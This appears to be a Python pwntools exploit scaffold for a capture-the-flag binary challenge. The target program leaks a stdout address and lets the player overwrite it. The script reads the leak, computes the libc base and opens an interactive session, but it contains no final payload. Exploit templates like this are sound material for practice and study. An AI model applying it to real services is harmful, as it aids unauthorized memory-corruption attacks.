from pwn import *

'''
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("%p\n", _bss_start);
  read(0, _bss_start, 0xE0uLL);
  puts("modify finished!");
  _exit(0);
}
'''

context.binary = elf = ELF('./prob')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "ASDF 1234".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')

lb = int(rl().strip(), 16) - libc.sym["_IO_2_1_stdout_"]
slog("libc_base",  lb)



p.interactive()